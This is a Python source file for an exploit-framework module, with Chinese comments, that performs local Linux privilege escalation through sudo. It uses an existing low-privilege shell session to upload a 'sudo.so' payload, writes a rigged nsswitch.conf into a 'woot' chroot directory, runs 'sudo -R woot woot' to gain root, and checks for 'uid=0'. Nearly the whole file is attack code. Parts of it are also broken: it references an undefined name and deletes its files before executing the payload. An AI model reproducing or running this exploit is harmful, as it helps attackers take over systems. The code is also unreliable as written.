import os
import sys
import subprocess
import threading
import fcntl
def safe_print(msg):
    with open(sys.stdout.fileno(), 'wb', closefd=False) as fd:
        fcntl.flock(fd, fcntl.LOCK_EX)  # 加锁
        sys.stdout.write(msg + '\n')
        sys.stdout.flush()
        fcntl.flock(fd, fcntl.LOCK_UN)  # 解锁

class Module:
    def __init__(self):
        self.name = "QPrivilege Management"
        self.port = None                # 本地提权，无网络端口
        self.protocol = "local"
        self.platform = "linux"
        self.session = True
        self.use_msf = False
        module_dir = os.path.dirname(os.path.abspath(__file__))
        self.payload_path = os.path.join(module_dir, "..", "payloads", "sudo.so")

    def exploit(self, target_ip=None, target_port=None, lhost=None, session=None):
        if session is None:
            return False, "需要一个已获取的低权限 shell 会话"
        if not os.path.exists(self.payload_path):
            return False, f"Payload 文件不存在: {self.payload_path}，请先编译 sudo.c"

        remote_path = "/tmp/poc"
        remote_path_woot = remote_path + '/woot'
        try:
            session.push(self.payload_path, remote_path)
            session.execute(f"cd {remote_path}")
            session.execute(f"cp {sudo.so} /dev/shm/")
            session.execute("mkdir -p woot/etc")
            session.execute('echo "passwd: /dev/shm/sudo.so" > woot/etc/nsswitch.conf')
            session.execute("cp /etc/group woot/etc")
            session.execute("sudo -R woot woot")
            session.execute(f"rm -rf {remote_path} {remote_path_woot} /dev/shm/sudo.so")
        except Exception as e:
            return False, f"推送文件失败: {e}"

        try:
            output = session.execute(remote_path, timeout=60)
            if "result 0" in output or "uid=0" in output:
                return True, "Sudo 提权成功，已获得 Root 权限"
            else:
                return False, f"\n提权执行失败，输出: {output[:200]}"
        except Exception as e:
            return False, f"执行 payload 时出错: {e}"
